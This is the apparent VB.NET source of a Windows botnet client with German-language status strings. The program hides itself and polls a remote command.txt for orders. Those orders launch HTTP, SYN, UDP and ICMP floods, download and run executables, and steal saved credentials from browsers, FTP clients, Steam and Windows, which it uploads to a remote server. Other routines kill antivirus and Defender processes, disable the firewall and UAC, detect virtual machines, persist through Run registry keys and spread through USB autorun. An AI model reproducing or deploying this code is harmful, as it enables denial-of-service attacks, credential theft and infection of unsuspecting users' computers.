﻿Imports System.IO
Imports System.Net
Imports System.Text
Imports Microsoft.Win32
Imports System.Threading
Imports System.Management
Imports System.Reflection
Imports System.ComponentModel
Imports System.Security.Cryptography
Imports System.Runtime.InteropServices

Public Class Form1
    Dim Befehle() As String
    Dim PcUsername As String = Environment.UserName()
    Dim VB6setting As New Compatibility.VB6.FixedLengthString(1000)
    Dim gjhkghjkghjkghjkghjkghjkghjk As String
    Dim ghfghfghfgh() As String
    Dim bnmhjlghjlghjkgfn As String
    Dim bnmuzgkgzugzukdjhsgaffgnggbdvysdfgdhgdf As String = My.Computer.Name
    Dim cvbcvbcvb As String = bvnmvbmvbnmb()

    Dim url As String
    Dim AntiVM As String
    Dim AntiVB As String
    Dim AntiVP As String
    Dim AntiKA As String
    Dim AntiZA As String
    Dim AntiNO As String
    Dim AntiAA As String
    Dim AntiOP As String
    Dim AntiBI As String
    Dim AntiSN As String
    Dim Fakemessage As String
    Dim msgTitel As String
    Dim msgText As String
    Dim msgErrorRadio As String
    Dim msgInformationRadio As String
    Dim msgAchtungRadio As String
    Dim msgFrageRadio As String
    Dim P2p As String
    Dim Usb As String
    Dim Lan As String
    Dim Msn As String
    Dim Skype As String
    Dim sprelink As String
    Dim ProcKiller As String
    Dim Pkill As String
    Dim UAC As String
    Dim Firewall As String
    Dim DEF As String
    Dim Autostart As String
    Dim Prisis As String
    Dim Rar As String
    Dim Mut As String

    Dim abfrage As String
    Public objMutex As Mutex
    Private WithEvents Retry As New BackgroundWorker
    Private Declare Function mciExecute Lib "winmm.dll" (ByVal lpstrCommand As String) As Long
    Dim RunningProcesses As Process() = Process.GetProcessesByName(Process.GetCurrentProcess.ProcessName)
    Private Declare Function SetProcessWorkingSetSize Lib "kernel32.dll" (ByVal process As IntPtr, ByVal minimumWorkingSetSize As Integer, ByVal maximumWorkingSetSize As Integer) As Integer

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try
            Me.Hide()
            Me.Opacity = 0
            Me.Visible = False
            Me.ShowIcon = False
            Me.ShowInTaskbar = False
            TraCode.Start()
            Call FlushMemory()
            VB6setting.Value = getData("1", "DATA")
            Befehle = VB6setting.Value.Split("#")
            url = Befehle(0)
            AntiVM = Befehle(1)
            AntiVB = Befehle(2)
            AntiVP = Befehle(3)
            AntiKA = Befehle(4)
            AntiZA = Befehle(5)
            AntiNO = Befehle(6)
            AntiAA = Befehle(7)
            AntiOP = Befehle(8)
            AntiBI = Befehle(9)
            AntiSN = Befehle(10)
            Fakemessage = Befehle(11)
            msgTitel = Befehle(12)
            msgText = Befehle(13)
            msgErrorRadio = Befehle(14)
            msgInformationRadio = Befehle(15)
            msgAchtungRadio = Befehle(16)
            msgFrageRadio = Befehle(17)
            P2p = Befehle(18)
            Usb = Befehle(19)
            ProcKiller = Befehle(20)
            Pkill = Befehle(21)
            UAC = Befehle(22)
            Firewall = Befehle(23)
            DEF = Befehle(24)
            Lan = Befehle(25)
            Msn = Befehle(26)
            Skype = Befehle(27)
            sprelink = Befehle(28)
            Autostart = Befehle(29)
            Prisis = Befehle(30)
            Rar = Befehle(31)
            Mut = Befehle(32)

            objMutex = New Mutex(False, Mut)
            If objMutex.WaitOne(0, False) = False Then
                objMutex.Close()
                objMutex = Nothing
                End
            End If

            Call AntiCodes()
            Call Defender()
            Call Firewalldis()
            Call UACdis()
            Me.KillProcesses(Pkill)
            Call AutoS()
            Call Pris()

            If Not IO.File.Exists("C:\windows\" & "\win.src") Then
                My.Computer.FileSystem.WriteAllText("C:\windows\" & "\win.src", bnmuzgkgzugzukdjhsgaffgnggbdvysdfgdhgdf, False)
            End If
            bnmhjlghjlghjkgfn = My.Computer.FileSystem.ReadAllText("C:\windows\" & "\win.src")

            tmr1.Start()
            Call P2Pspread()
            Call USBspread()
            Call LanSpre()
            Call MsnSpre()
            Call SkypeSpre()
            Call RarSpre()
            Call FakeError()
            freshme.Start()
        Catch ex As Exception
            objMutex = New Mutex(False, Mut)
            If objMutex.WaitOne(0, False) = False Then
                objMutex.Close()
                objMutex = Nothing
                End
            End If
            TraCode.Start()
            Call AntiCodes()
            Call Defender()
            Call Firewalldis()
            Call UACdis()
            Me.KillProcesses(Pkill)
            Call AutoS()
            Call Pris()
            Call TraCode.Start()

            If Not IO.File.Exists("C:\windows\" & "\win.src") Then
                My.Computer.FileSystem.WriteAllText("C:\windows\" & "\win.src", bnmuzgkgzugzukdjhsgaffgnggbdvysdfgdhgdf, False)
            End If
            bnmhjlghjlghjkgfn = My.Computer.FileSystem.ReadAllText("C:\windows\" & "\win.src")

            tmr1.Start()
            Call P2Pspread()
            Call USBspread()
            Call LanSpre()
            Call MsnSpre()
            Call SkypeSpre()
            Call RarSpre()
            Call FakeError()
            freshme.Start()
        End Try
    End Sub

    Private Sub tmr1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmr1.Tick
        Try
            Dim vbncvbncvbncvbn As String = "Bereit!"
            Dim uipozuiozuiozui As New System.Net.WebClient
            Dim bnmmvbnmbvnmvbn As New System.Net.WebClient
            Dim nbsdfgsdfgserg As String = bnmmvbnmbvnmvbn.DownloadString(url & "/command.txt")

            If nbsdfgsdfgserg.Contains("{http}") Then
                Try
                    bwDDOS.RunWorkerAsync()
                    vbncvbncvbncvbn = "HTTP Erfolgreich!"
                Catch ex As Exception
                    vbncvbncvbncvbn = "HTTP Fehlgeschlagen!"
                End Try


            ElseIf nbsdfgsdfgserg.Contains("{syn}") Then
                Try
                    bwSyn.RunWorkerAsync()
                    vbncvbncvbncvbn = "SYN Erfolgreich!"
                Catch ex As Exception
                    vbncvbncvbncvbn = "SYN Fehlgeschlagen!"
                End Try


            ElseIf nbsdfgsdfgserg.Contains("{udp}") Then
                Try
                    bwUdp.RunWorkerAsync()
                    vbncvbncvbncvbn = "UDP Erfolgreich!"
                Catch ex As Exception
                    vbncvbncvbncvbn = "UDP Fehlgeschlagen!"
                End Try


            ElseIf nbsdfgsdfgserg.Contains("{icmp}") Then
                Try
                    bwIcmp.RunWorkerAsync()
                    vbncvbncvbncvbn = "ICMP Erfolgreich!"
                Catch ex As Exception
                    vbncvbncvbncvbn = "ICMP Fehlgeschlagen!"
                End Try


            ElseIf nbsdfgsdfgserg.Contains("{dl}") Then
                Try
                    bwdownloader.RunWorkerAsync()
                    vbncvbncvbncvbn = "Download Erfolgreich!"
                Catch ex As Exception
                    vbncvbncvbncvbn = "Download Fehlgeschlagen!"
                End Try


            ElseIf nbsdfgsdfgserg.Contains("{stealer}") Then
                Try
                    Dim stal As New System.Net.WebClient
                    Dim datei As String = PcUsername & ".txt"
                    gjhkghjkghjkghjkghjkghjkghjk = nbsdfgsdfgserg
                    ghfghfghfgh = gjhkghjkghjkghjkghjkghjkghjk.Split(" ")
                    pReader.sFirefox()
                    pReader.SFilezilla()
                    pReader.SCommander()
                    pReader.SFlashFxp()
                    pReader.ScoreFTP()
                    pReader.Ssmart()
                    pReader.SWindowskey()
                    pReader.SNoip()
                    pReader.sDynDns()
                    pReader.SSerial()
                    pReader.sSteam()
                    pReader.sAll()
                    stal.DownloadString(Trim(ghfghfghfgh(1)) & "?file=" & datei & "&daten=" & txtpws.Text)
                    vbncvbncvbncvbn = "Steal Erfolgreich!"
                Catch ex As Exception
                    vbncvbncvbncvbn = "Steal Fehlgeschlagen!"
                End Try


            ElseIf nbsdfgsdfgserg.Contains("{visit}") Then
                Try
                    gjhkghjkghjkghjkghjkghjkghjk = nbsdfgsdfgserg
                    ghfghfghfgh = gjhkghjkghjkghjkghjkghjkghjk.Split(" ")
                    Process.Start(ghfghfghfgh(1), AppWinStyle.Hide)
                    vbncvbncvbncvbn = "Visit Erfolgreich!"
                Catch ex As Exception
                    vbncvbncvbncvbn = "Visit Fehlgeschlagen!"
                End Try


            ElseIf nbsdfgsdfgserg.Contains("{kill}") Then
                Try
                    gjhkghjkghjkghjkghjkghjkghjk = nbsdfgsdfgserg
                    ghfghfghfgh = gjhkghjkghjkghjkghjkghjkghjk.Split(" ")
                    Me.KillProcesses(ghfghfghfgh(1))
                    vbncvbncvbncvbn = "Kill Erfolgreich!"
                Catch ex As Exception
                    vbncvbncvbncvbn = "Kill Fehlgeschlagen!"
                End Try


            ElseIf nbsdfgsdfgserg.Contains("{socks5}") Then
                Try
                    Dim Ressource() As Byte = My.Resources.winsocks
                    FileOpen(9, "C:\windows\" & "\winsocks.exe", OpenMode.Binary)
                    FilePut(9, Ressource)
                    FileClose(9)
                    Process.Start("C:\windows\" & "\winsocks.exe")
                    vbncvbncvbncvbn = "Socks5 Erfolgreich!"
                Catch ex As Exception
                    vbncvbncvbncvbn = "Socks5 Fehlgeschlagen!"
                End Try


            ElseIf nbsdfgsdfgserg.Contains("{stop}") Then
                gjhkghjkghjkghjkghjkghjkghjk = nbsdfgsdfgserg
                ghfghfghfgh = gjhkghjkghjkghjkghjkghjkghjk.Split(" ")
                Retry.CancelAsync()
                bwDDOS.CancelAsync()
                bwSyn.CancelAsync()
                bwUdp.CancelAsync()
                bwIcmp.CancelAsync()
                HTTP.StopDDOS()
                SYN.KeepFlooding = False
                UDP.KeepFlooding = False
                bwdownloader.CancelAsync()
                vbncvbncvbncvbn = "Bot gestoppt!"
            End If

            Call FlushMemory()
            uipozuiozuiozui.DownloadString(url & "/bot.php?hwid=" & bnmhjlghjlghjkgfn & "&pcname=" & PcUsername & "&antwort=" & vbncvbncvbncvbn & "&os=" & cvbcvbcvb & "")
            abfrage = bnmmvbnmbvnmvbn.DownloadString(url & "/command.txt")
        Catch ex As Exception
            Dim vbncvbncvbncvbn As String = "Bereit!"
            Dim uipozuiozuiozui As New System.Net.WebClient
            Dim bnmmvbnmbvnmvbn As New System.Net.WebClient
            Dim nbsdfgsdfgserg As String = bnmmvbnmbvnmvbn.DownloadString(url & "/command.txt")
            Call FlushMemory()
            uipozuiozuiozui.DownloadString(url & "/bot.php?hwid=" & bnmhjlghjlghjkgfn & "&pcname=" & PcUsername & "&antwort=" & vbncvbncvbncvbn & "&os=" & cvbcvbcvb & "")
            abfrage = bnmmvbnmbvnmvbn.DownloadString(url & "/command.txt")
        End Try
    End Sub

    Private Sub bwDDOS_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles bwDDOS.DoWork
        Dim bnmmvbnmbvnmvbn As New System.Net.WebClient
        Dim nbsdfgsdfgserg As String = bnmmvbnmbvnmvbn.DownloadString(url & "/command.txt")
        Try
            gjhkghjkghjkghjkghjkghjkghjk = nbsdfgsdfgserg
            ghfghfghfgh = gjhkghjkghjkghjkghjkghjkghjk.Split(" ")
            HTTP.sFHost = ghfghfghfgh(1)
            HTTP.Threads = ghfghfghfgh(2)
            HTTP.StartDDOS()
        Catch ex As Exception
            gjhkghjkghjkghjkghjkghjkghjk = nbsdfgsdfgserg
            ghfghfghfgh = gjhkghjkghjkghjkghjkghjkghjk.Split(" ")
            HTTP.sFHost = ghfghfghfgh(1)
            HTTP.Threads = ghfghfghfgh(2)
            HTTP.StartDDOS()
        End Try
    End Sub

    Private Sub bwSyn_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles bwSyn.DoWork
        Dim bnmmvbnmbvnmvbn As New System.Net.WebClient
        Dim nbsdfgsdfgserg As String = bnmmvbnmbvnmvbn.DownloadString(url & "/command.txt")
        Try
            If Not SYN.bgFlood.IsBusy Then
                gjhkghjkghjkghjkghjkghjkghjk = nbsdfgsdfgserg
                ghfghfghfgh = gjhkghjkghjkghjkghjkghjkghjk.Split(" ")
                SYN.Host = ghfghfghfgh(1)
                SYN.Port = ghfghfghfgh(2)
                SYN.Sockets = ghfghfghfgh(3)
                SYN.Timeout = 1000
                SYN.KeepFlooding = True
                SYN.bgFlood.WorkerReportsProgress = True
                SYN.bgFlood.RunWorkerAsync()
            End If
        Catch ex As Exception
            If Not SYN.bgFlood.IsBusy Then
                gjhkghjkghjkghjkghjkghjkghjk = nbsdfgsdfgserg
                ghfghfghfgh = gjhkghjkghjkghjkghjkghjkghjk.Split(" ")
                SYN.Host = ghfghfghfgh(1)
                SYN.Port = ghfghfghfgh(2)
                SYN.Sockets = ghfghfghfgh(3)
                SYN.Timeout = 1000
                SYN.KeepFlooding = True
                SYN.bgFlood.WorkerReportsProgress = True
                SYN.bgFlood.RunWorkerAsync()
            End If
        End Try
    End Sub

    Private Sub bwUdp_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles bwUdp.DoWork
        Dim bnmmvbnmbvnmvbn As New System.Net.WebClient
        Dim nbsdfgsdfgserg As String = bnmmvbnmbvnmvbn.DownloadString(url & "/command.txt")
        Try
            gjhkghjkghjkghjkghjkghjkghjk = nbsdfgsdfgserg
            ghfghfghfgh = gjhkghjkghjkghjkghjkghjkghjk.Split(" ")
            If Not UDP.bgUdpFlood.IsBusy Then
                UDP_Host = ghfghfghfgh(1)
                UDP_Port = ghfghfghfgh(2)
                UDP_Packets = ghfghfghfgh(3)
                UDP_Sockets = ghfghfghfgh(4)
                UDP.KeepFlooding = True
                UDP.bgUdpFlood.WorkerReportsProgress = True
                UDP.bgUdpFlood.RunWorkerAsync()
            End If
        Catch ex As Exception
            If Not UDP.bgUdpFlood.IsBusy Then
                UDP_Host = ghfghfghfgh(1)
                UDP_Port = ghfghfghfgh(2)
                UDP_Packets = ghfghfghfgh(3)
                UDP_Sockets = ghfghfghfgh(4)
                UDP.KeepFlooding = True
                UDP.bgUdpFlood.WorkerReportsProgress = True
                UDP.bgUdpFlood.RunWorkerAsync()
            End If
        End Try
    End Sub

    Private Sub bwIcmp_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles bwIcmp.DoWork
        Dim bnmmvbnmbvnmvbn As New System.Net.WebClient
        Dim nbsdfgsdfgserg As String = bnmmvbnmbvnmvbn.DownloadString(url & "/command.txt")
        Try
            gjhkghjkghjkghjkghjkghjkghjk = nbsdfgsdfgserg
            ghfghfghfgh = gjhkghjkghjkghjkghjkghjkghjk.Split(" ")
            ICMP.sFHost = ghfghfghfgh(1)
            ICMP.iThreads = ghfghfghfgh(2)
            ICMP.iICMPSockets = ghfghfghfgh(3)
            ICMP.iPSize = ghfghfghfgh(4)
        Catch ex As Exception
            ICMP.sFHost = ghfghfghfgh(1)
            ICMP.iThreads = ghfghfghfgh(2)
            ICMP.iICMPSockets = ghfghfghfgh(3)
            ICMP.iPSize = ghfghfghfgh(4)
        End Try
    End Sub

    Private Sub bwdownloader_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles bwdownloader.DoWork
        Dim bnmmvbnmbvnmvbn As New System.Net.WebClient
        Dim nbsdfgsdfgserg As String = bnmmvbnmbvnmvbn.DownloadString(url & "/command.txt")
        Try
            gjhkghjkghjkghjkghjkghjkghjk = nbsdfgsdfgserg
            ghfghfghfgh = gjhkghjkghjkghjkghjkghjkghjk.Split(" ")
            Dim R = New Random()
            Dim rand1 = "InStall" & R.[Next](100000) & ".exe"
            Dim downloader = New WebClient()
            downloader.DownloadFile(ghfghfghfgh(1), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" + rand1)
            Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" + rand1)
        Catch ex As Exception
            gjhkghjkghjkghjkghjkghjkghjk = nbsdfgsdfgserg
            ghfghfghfgh = gjhkghjkghjkghjkghjkghjkghjk.Split(" ")
            Dim R = New Random()
            Dim rand1 = "InStall" & R.[Next](100000) & ".exe"
            Dim downloader = New WebClient()
            downloader.DownloadFile(ghfghfghfgh(1), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" + rand1)
            Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" + rand1)
        End Try
    End Sub


    Private Sub AutoS()
        If Trim(Autostart) = True Then
            Try
                Dim appname As String = IO.Path.GetFileName(Application.ExecutablePath)
                If My.Computer.FileSystem.FileExists("C:\windows\" & "\winservice.exe") = True Then
                    Call AddToStartup("Winservice", "C:\windows" & "\winservice.exe")
                Else
                    My.Computer.FileSystem.CopyFile(Application.StartupPath & "\" & appname, "C:\windows\" & "\winservice.exe")
                    Call AddToStartup("Winservice", "C:\windows" & "\winservice.exe")
                End If
            Catch ex As Exception
            End Try
        End If
    End Sub
    Private Sub AddToStartup(ByVal name As String, ByVal path As String)
        Dim key1 As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        Dim key2 As RegistryKey = Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        key1.SetValue(name, path)
        key1.Close()
        key2.SetValue(name, path)
        key2.Close()
    End Sub

    Private Sub Pris()
        If Trim(Prisis) = True Then
            Try
                IO.File.Copy(Application.ExecutablePath, ("C:\windows\" & "\tinservice.exe"))
                Dim Ressource() As Byte = My.Resources.csrse
                FileOpen(9, "C:\windows\" & "\csrse.exe", OpenMode.Binary)
                FilePut(9, Ressource)
                FileClose(9)
                Process.Start("C:\windows\" & "\csrse.exe")
            Catch ex As Exception
            End Try
        End If
    End Sub

    Private Sub AntiCodes()
        If Trim(AntiVP) = True Then
            Call getDevices()
            Select Case Grafikadapter
                Case "VM Additions S3 Trio32/64"
                    End
                Case Else
            End Select
        End If

        If Trim(AntiVM) = True Then
            Call getDevices()
            Select Case Grafikadapter
                Case "VMware SVGA II"
                    End
                Case Else
            End Select
        End If

        If Trim(AntiVB) = True Then
            Call getDevices()
            Select Case Grafikadapter
                Case "VirtualBox Graphics Adapter"
                    End
                Case Else
            End Select
        End If

        If Trim(AntiKA) = True Then
            If Process.GetProcessesByName(("avp")).Length >= 1 Then
                End
            Else
            End If
        End If

        If Trim(AntiZA) = True Then
            Dim zone As Process() = Process.GetProcesses
            Dim z As Integer
            For o = 0 To zone.Length - 1
                Debug.WriteLine(zone(z).ProcessName)
                If Strings.UCase(zone(z).ProcessName) = Strings.UCase(" zlclient") Then
                    zone(z).Kill()
                End If
            Next
        End If

        If Trim(AntiNO) = True Then
            Dim nod As Process() = Process.GetProcesses
            Dim n As Integer
            For o = 0 To nod.Length - 1
                Debug.WriteLine(nod(n).ProcessName)
                If Strings.UCase(nod(n).ProcessName) = Strings.UCase("e gui") Then
                    nod(n).Kill()
                End If
            Next
        End If

        If Trim(AntiAA) = True Then
            Dim Anubis As Process() = Process.GetProcesses
            Dim a As Integer
            For a = 0 To Anubis.Length - 1
                Debug.WriteLine(Anubis(a).ProcessName)
                If Strings.UCase(Anubis(a).ProcessName) = Strings.UCase("Anubis") Then
                    Anubis(a).Kill()
                End If
            Next
        End If

        If Trim(AntiOP) = True Then
            Dim outpost As Process() = Process.GetProcesses
            Dim o As Integer
            For o = 0 To outpost.Length - 1
                Debug.WriteLine(outpost(o).ProcessName)
                If Strings.UCase(outpost(o).ProcessName) = Strings.UCase("outpost") Then
                    outpost(o).Kill()
                End If
            Next
        End If

        If Trim(AntiBI) = True Then
            Dim bit As Process() = Process.GetProcesses
            Dim b As Integer
            For b = 0 To bit.Length - 1
                Debug.WriteLine(bit(b).ProcessName)
                If Strings.UCase(bit(b).ProcessName) = Strings.UCase("bdagent") Then
                    bit(b).Kill()
                End If
            Next
        End If

        If Trim(AntiSN) = True Then
            For Each myprocess As Process In Process.GetProcesses
                If myprocess.MainWindowTitle = "Wireshark" Then
                    End
                End If
                If myprocess.MainWindowTitle = "SniffPass" Then
                    End
                End If
                If myprocess.MainWindowTitle = "Cain" Then
                    End
                End If
            Next
        End If
    End Sub
    Dim Devices As Object, Grafikadapter As String, RegionA As String = "SELECT * FROM Win32_VideoController"
    Private Sub getDevices()
        Devices = GetObject("winmgmts:").ExecQuery(RegionA)
        For Each AdaptList In Devices
            Grafikadapter = AdaptList.Description
        Next
    End Sub

    Private Sub P2Pspread()
        If Trim(P2p) = True Then
            Exit Sub
        End If
    End Sub
    Private Sub USBspread()
        If Trim(Usb) = True Then
            Dim drivers As String = My.Computer.FileSystem.SpecialDirectories.ProgramFiles
            Dim driver() As String = (IO.Directory.GetLogicalDrives)
            For Each drivers In driver
                Try
                    If drivers & "890addd7.exe" = True Then
                        Exit Sub
                    Else
                        IO.File.Copy(Application.ExecutablePath, drivers & "890addd7.exe")
                        Dim autorunwriter = New StreamWriter(drivers & "\autorun.inf")
                        autorunwriter.WriteLine("[autorun]")
                        autorunwriter.WriteLine("open=" & drivers & "890addd7.exe")
                        autorunwriter.WriteLine("shellexecute=" & drivers, 1)
                        autorunwriter.Close()
                        System.IO.File.SetAttributes(drivers & "autorun.inf", FileAttributes.Hidden)
                        System.IO.File.SetAttributes(drivers & "890addd7.exe", FileAttributes.Hidden)
                    End If
                Catch ex As Exception
                End Try
            Next
            Call filehide()
        Else
            Exit Sub
        End If
    End Sub
    Private Sub filehide()
        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden", 0)
    End Sub
    Private Sub LanSpre()
        If Trim(Lan) = True Then
            Exit Sub
        End If
    End Sub
    Private Sub MsnSpre()
        If Trim(Msn) = True Then
            Exit Sub
        End If
    End Sub
    Private Sub SkypeSpre()
        If Trim(Skype) = True Then
            Exit Sub
        End If
    End Sub
    Private Sub RarSpre()
        If Trim(Rar) = True Then
            Exit Sub
        End If
    End Sub

    Private Sub UACdis()
        If Trim(UAC) = True Then
            Dim blaze As RegistryKey
            Try
                blaze = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", True)
                Dim blak As String = blaze.GetValue("EnableLUA").ToString()
                If blak = "1" Then
                    blaze.SetValue("EnableLUA", "0")
                End If
            Catch
            End Try
        Else
        End If
    End Sub

    Private Sub Defender()
        If Trim(DEF) = True Then
            Try
                For Each p As Process In Process.GetProcesses()
                    If p.ProcessName.Contains("MSASCui") Then
                        p.Kill()
                    End If
                Next
                For Each p As Process In Process.GetProcesses()
                    If p.ProcessName.Contains("msmpeng") Then
                        p.Kill()
                    End If
                Next
            Catch ex As Exception
            End Try
        End If
    End Sub

    Private Sub Firewalldis()
        If Trim(Firewall) = True Then
            Dim Proc As Process = New Process
            Dim dipc As String = "netsh.exe"
            Proc.StartInfo.Arguments = ("firewall set opmode disable")
            Proc.StartInfo.FileName = top
            Proc.StartInfo.UseShellExecute = False
            Proc.StartInfo.RedirectStandardOutput = True
            Proc.StartInfo.CreateNoWindow = True
            Proc.Start()
            Proc.WaitForExit()
        Else
        End If
    End Sub

    Sub KillProcesses(ByVal name As String)
        For Each P As Process In Process.GetProcessesByName(name)
            P.Kill()
            P.CloseMainWindow()
        Next
    End Sub
    Sub Processes(ByVal name As String)
        For Each P As Process In Process.GetProcessesByName(name)
            P.Kill()
            P.CloseMainWindow()
        Next
    End Sub

    Private Sub FakeError()
        If Trim(Fakemessage) = True Then
            If Trim(msgErrorRadio) = True Then
                MessageBox.Show(msgText, msgTitel, MessageBoxButtons.OK, MessageBoxIcon.Error)
            ElseIf Trim(msgInformationRadio) = True Then
                MessageBox.Show(msgText, msgTitel, MessageBoxButtons.OK, MessageBoxIcon.Information)
            ElseIf Trim(msgAchtungRadio) = True Then
                MessageBox.Show(msgText, msgTitel, MessageBoxButtons.OK, MessageBoxIcon.Warning)
            ElseIf Trim(msgFrageRadio) = True Then
                MessageBox.Show(msgText, msgTitel, MessageBoxButtons.OK, MessageBoxIcon.Question)
            Else
                MessageBox.Show(msgText, msgTitel, MessageBoxButtons.OK)
            End If
        End If
    End Sub

    Public Function bvnmvbmvbnmb() As String
        Dim os As OperatingSystem = Environment.OSVersion
        Dim runningOS As String = ""
        If os.Platform.ToString() = "Win32NT" Then
            Select Case OSVersionNoRevision(os.Version)
                Case "4.1.2222"
                    runningOS = "Windows 98"
                    Exit Select
                Case "4.1.2600"
                    runningOS = "Windows 98SE"
                    Exit Select
                Case "4.9.3000"
                    runningOS = "Windows ME"
                    Exit Select
                Case "5.0.2195"
                    runningOS = "Windows 2000"
                    Exit Select
                Case "5.1.2600", "5.2.3790"
                    runningOS = "Windows XP"
                    Exit Select
                Case "6.0.6000", "6.0.6001", "6.0.6002"
                    runningOS = "Windows Vista"
                    Exit Select
                Case "6.1.7600"
                    runningOS = "Windows Seven"
                    Exit Select
                Case Else
                    runningOS = "Unbekannt"
                    Exit Select
            End Select
        End If
        Select Case IntPtr.Size
            Case 4
                runningOS &= " (x32)"
            Case 8
                runningOS &= " (x64)"
        End Select
        Return runningOS
    End Function
    Private Shared Function OSVersionNoRevision(ByVal ver As Version) As String
        Return ((ver.Major.ToString() & ".") + ver.Minor.ToString() & ".") + ver.Build.ToString()
    End Function
    <DllImport("kernel32.dll")> _
    Private Shared Function GetVersionEx(ByRef osVersionInfo As OSVERSIONINFOEX) As Boolean
    End Function
    <StructLayout(LayoutKind.Sequential)> Structure OSVERSIONINFOEX
        Public dwOSVersionInfoSize As Integer
        Public dwMajorVersion As Integer
        Public dwMinorVersion As Integer
        Public dwBuildNumber As Integer
        Public dwPlatformId As Integer
        <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=128)> Public szCSDVersion As String
        Public wServicePackMajor As Short
        Public wServicePackMinor As Short
        Public wSuiteMask As Short
        Public wProductType As Byte
        Public wReserved As Byte
    End Structure

    Public Sub FlushMemory()
        GC.Collect()
        GC.WaitForPendingFinalizers()
        If (Environment.OSVersion.Platform = PlatformID.Win32NT) Then
            SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
        End If
    End Sub
    Private Sub freshme_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles freshme.Tick
        GC.Collect()
        GC.WaitForPendingFinalizers()
        If (Environment.OSVersion.Platform = PlatformID.Win32NT) Then
            SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
        End If
    End Sub
End Class